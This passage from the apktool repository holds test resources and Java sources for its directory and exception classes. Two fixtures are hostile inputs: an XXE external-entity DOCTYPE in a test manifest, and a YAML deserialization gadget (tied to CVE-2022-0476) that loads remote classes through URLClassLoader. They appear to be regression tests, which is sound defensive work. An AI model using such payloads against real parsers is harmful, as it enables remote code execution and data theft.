aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/res/values/attrs.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<resources>
    <attr format="integer" name="test_attr1"/>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/res/values/ids.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<resources>
    <item type="id" name="test_attr1" />
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/res/values/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">testapp</string>
    <string name="long_string_32767" />
    <string name="surrogate_issue_2299">🔆</string>
    <string name="html_string_issue_2632"><ul> <li><b>aaaaa aa aaaaa</b> – aaaaaaa aaaaaaaaaa aa aaaaaaaa aaaaaa aaaaa (aaaa) aaaa aaaaaaaaa aaaaa aa aaaaaaaaa aaaaaaa aaaa</li> <li><b>aaaaaaaaa aaaaaaaaaaaaaaa aaaaaaaa</b> – aaaaaaa aaaaaaaaaa aaaaaaaaa aaaa aaaaaa aa aaaa aaaa aaaa aaaa aaaaaaa aaaaaaaaaaaaa, aaaaaa aaa aaaaaaaaaa (aaa) aaaaaaaaaaaaaaa</li> <li><b>aaaaaaaaaaa aaaaaa aaaaaaaaaa</b> – aaaaaaaaaa aaaa aaaaaa aa a aaa aa aaaaaa aaa aaaaaaa (aaaaa aaaaaaaa) aaaaaaaa aa aaaaaa aaaaa aaa aaaa</li> </ul></string>
    <string name="styled_string_issue_2815">Quickly zoom in on the screen to display content more clearly.<br/><br/> <b>To zoom in:</b><br/> 1. Use shortcut to start magnification<br/> 2. Tap the screen<br/> 3. Drag 2 fingers to move around screen<br/> 4. Pinch with 2 fingers to adjust zoom<br/> 5. Use shortcut to stop magnification<br/><br/> <b>To zoom in temporarily:</b><br/> 1. Use shortcut to start magnification<br/> 2. Touch &amp; hold anywhere on the screen<br/> 3. Drag finger to move around screen<br/> 4. Lift finger to stop magnification</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/res/xml/ww_box_styles_schema.xsd`:

```xsd
<?xml version="1.0" encoding="utf-8"?>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
    <xs:element name="test">
        <xs:complexType>
            <xs:sequence>
                <xs:element name="person" type="xs:string"/>
                <xs:element name="address">
                    <xs:complexType>
                        <xs:sequence>
                            <xs:element name="name" type="xs:string"/>
                            <xs:element name="address" type="xs:string"/>
                            <xs:element name="city" type="xs:string"/>
                            <xs:element name="country" type="xs:string"/>
                        </xs:sequence>
                    </xs:complexType>
                </xs:element>
            </xs:sequence>
        </xs:complexType>
    </xs:element>
</xs:schema>
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/smali/HelloWorld.smali`:

```smali
.class public LHelloWorld;

.super Ljava/lang/Object;

.method public static main([Ljava/lang/String;)V
    .registers 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/smali_classes2/HelloDualDexSupport.smali`:

```smali
.class public LHelloDualDexSupport;

.super Ljava/lang/Object;

.method public static main([Ljava/lang/String;)V
    .registers 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/smali_classes3/HelloTripleDexSupport.smali`:

```smali
.class public LHelloTripleDexSupport;

.super Ljava/lang/Object;

.method public static main([Ljava/lang/String;)V
    .registers 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method
```

`brut.apktool/apktool-lib/src/test/resources/decode/doctype/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE manifest [<!ENTITY e1 SYSTEM 'http://ibotpeaches.com?z=APKTOOLXXE;'>]>
<manifest hardwareAccelerated="true" package="com.ibotpeaches.doctype" platformBuildVersionCode="24" platformBuildVersionName="6.0-2456767" xmlns:android="http://schemas.android.com/apk/res/android">
    &e1;
<supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:resizeable="true" android:smallScreens="true" android:xlargeScreens="true"/>
</manifest>
```

`brut.apktool/apktool-lib/src/test/resources/decode/doctype/apktool.yml`:

```yml
version: 2.0.0
apkFileName: doctype.apk
isFrameworkApk: false
usesFramework:
  ids:
  - 1
packageInfo:
  forcedPackageId: '127'
versionInfo:
  versionCode: '1'
  versionName: '1.0'
compressionType: false
```

`brut.apktool/apktool-lib/src/test/resources/decode/issue2543/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<manifest package="com.ibotpeaches.issue2543" platformBuildVersionCode="24" platformBuildVersionName="6.0-2456767" xmlns:android="http://schemas.android.com/apk/res/android">
</manifest>
```

`brut.apktool/apktool-lib/src/test/resources/decode/issue2543/apktool.yml`:

```yml
version: 2.0.0
apkFileName: issue2543.apk
isFrameworkApk: false
usesFramework:
  ids:
  - 1
packageInfo:
  forcedPackageId: '127'
versionInfo:
  versionCode: '1'
  versionName: '1.0'
compressionType: false
```

`brut.apktool/apktool-lib/src/test/resources/util/traversal/file`:

```
file
```

`brut.apktool/apktool-lib/src/test/resources/yaml/cve20220476/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="30" android:compileSdkVersionCodename="11" package="com.ibotpeaches.cve20220476" platformBuildVersionCode="30" platformBuildVersionName="11">
    <application android:debuggable="true" android:forceQueryable="true">
    </application>
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/yaml/cve20220476/apktool.yml`:

```yml
!!brut.androlib.meta.MetaInfo
apkFileName: cve20220476.apk
compressionType: false
some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://127.0.0.1:8000"]]]]
doNotCompress:
- resources.arsc
isFrameworkApk: false
packageInfo:
  forcedPackageId: '127'
  renameManifestPackage: null
sdkInfo:
  minSdkVersion: '25'
  targetSdkVersion: '30'
sharedLibrary: false
sparseResources: false
usesFramework:
  ids:
  - 1
  tag: null
version: 2.6.1-ddc4bb-SNAPSHOT
versionInfo:
  versionCode: null
  versionName: null

```

`brut.j.common/build.gradle`:

```gradle
/**
 *  Copyright 2014 Ryszard Wiśniewski <brut.alll@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */

dependencies {
    testImplementation depends.junit
}


```

`brut.j.common/src/main/java/brut/common/BrutException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.common;

public class BrutException extends Exception {
    public BrutException(Throwable cause) {
        super(cause);
    }

    public BrutException(String message, Throwable cause) {
        super(message, cause);
    }

    public BrutException(String message) {
        super(message);
    }

    public BrutException() {
    }
}

```

`brut.j.common/src/main/java/brut/common/InvalidUnknownFileException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.common;

public class InvalidUnknownFileException extends BrutException {
    public InvalidUnknownFileException(String message) {
        super(message);
    }
}

```

`brut.j.common/src/main/java/brut/common/RootUnknownFileException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.common;

public class RootUnknownFileException extends BrutException {
    public RootUnknownFileException(String message) {
        super(message);
    }
}

```

`brut.j.common/src/main/java/brut/common/TraversalUnknownFileException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.common;

public class TraversalUnknownFileException extends BrutException {
    public TraversalUnknownFileException(String message) {
        super(message);
    }
}

```

`brut.j.common/src/templates/apache2.0-header.txt`:

```txt
 Copyright (C) ${year} ${brut} <${brutEmail}>
 Copyright (C) ${year} ${ibot} <${ibotEmail}>

 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at

      https://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.


```

`brut.j.dir/build.gradle`:

```gradle
/**
 *  Copyright 2014 Ryszard Wiśniewski <brut.alll@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */

dependencies {
  implementation project(':brut.j.common'),
                 project(':brut.j.util'),
                 depends.commons_io
  testImplementation depends.junit
}

```

`brut.j.dir/src/main/java/brut/directory/AbstractDirectory.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.Map;
import java.util.Set;

public abstract class AbstractDirectory implements Directory {
    protected Set<String> mFiles;
    protected Set<String> mFilesRecursive;
    protected Map<String, AbstractDirectory> mDirs;

    @Override
    public Set<String> getFiles() {
        return getFiles(false);
    }

    @Override
    public Set<String> getFiles(boolean recursive) {
        if (mFiles == null) {
            loadFiles();
        }
        if (!recursive) {
            return mFiles;
        }
        if (mFilesRecursive == null) {
            mFilesRecursive = new LinkedHashSet<>(mFiles);
            for (Map.Entry<String, ? extends Directory> dir : getAbstractDirs().entrySet()) {
                for (String path : dir.getValue().getFiles(true)) {
                    mFilesRecursive.add(dir.getKey() + separator + path);
                }
            }
        }
        return mFilesRecursive;
    }

    @Override
    public boolean containsFile(String path) {
        SubPath subpath;
        try {
            subpath = getSubPath(path);
        } catch (PathNotExist e) {
            return false;
        }

        if (subpath.dir != null) {
            return subpath.dir.containsFile(subpath.path);
        }
        return getFiles().contains(subpath.path);
    }

    @Override
    public boolean containsDir(String path) {
        SubPath subpath;
        try {
            subpath = getSubPath(path);
        } catch (PathNotExist e) {
            return false;
        }

        if (subpath.dir != null) {
            return subpath.dir.containsDir(subpath.path);
        }
        return getAbstractDirs().containsKey(subpath.path);
    }

    @Override
    public Map<String, Directory> getDirs()
            throws UnsupportedOperationException {
        return getDirs(false);
    }

    @Override
    public Map<String, Directory> getDirs(boolean recursive)
            throws UnsupportedOperationException {
        return new LinkedHashMap<>(getAbstractDirs(recursive));
    }

    @Override
    public InputStream getFileInput(String path) throws DirectoryException {
        SubPath subpath = getSubPath(path);
        if (subpath.dir != null) {
            return subpath.dir.getFileInput(subpath.path);
        }
        if (! getFiles().contains(subpath.path)) {
            throw new PathNotExist(path);
        }
        return getFileInputLocal(subpath.path);
    }

    @Override
    public OutputStream getFileOutput(String path) throws DirectoryException {
        ParsedPath parsed = parsePath(path);
        if (parsed.dir == null) {
            getFiles().add(parsed.subpath);
            return getFileOutputLocal(parsed.subpath);
        }

        Directory dir;
        // IMPOSSIBLE_EXCEPTION
        try {
            dir = createDir(parsed.dir);
        } catch (PathAlreadyExists e) {
            dir = getAbstractDirs().get(parsed.dir);
        }
        return dir.getFileOutput(parsed.subpath);
    }

    @Override
    public Directory getDir(String path) throws PathNotExist {
        SubPath subpath = getSubPath(path);
        if (subpath.dir != null) {
            return subpath.dir.getDir(subpath.path);
        }
        if (! getAbstractDirs().containsKey(subpath.path)) {
            throw new PathNotExist(path);
        }
        return getAbstractDirs().get(subpath.path);
    }

    @Override
    public Directory createDir(String path) throws DirectoryException {
        ParsedPath parsed = parsePath(path);
        AbstractDirectory dir;
        if (parsed.dir == null) {
            if (getAbstractDirs().containsKey(parsed.subpath)) {
                throw new PathAlreadyExists(path);
            }
            dir = createDirLocal(parsed.subpath);
            getAbstractDirs().put(parsed.subpath, dir);
            return dir;
        }

        if (getAbstractDirs().containsKey(parsed.dir)) {
            dir = getAbstractDirs().get(parsed.dir);
        } else {
            dir = createDirLocal(parsed.dir);
            getAbstractDirs().put(parsed.dir, dir);
        }
        return dir.createDir(parsed.subpath);
    }

    @Override
    public boolean removeFile(String path) {
        SubPath subpath;
        try {
            subpath = getSubPath(path);
        } catch (PathNotExist e) {
            return false;
        }

        if (subpath.dir != null) {
            return subpath.dir.removeFile(subpath.path);
        }
        if (! getFiles().contains(subpath.path)) {
            return false;
        }
        removeFileLocal(subpath.path);
        getFiles().remove(subpath.path);
        return true;
    }

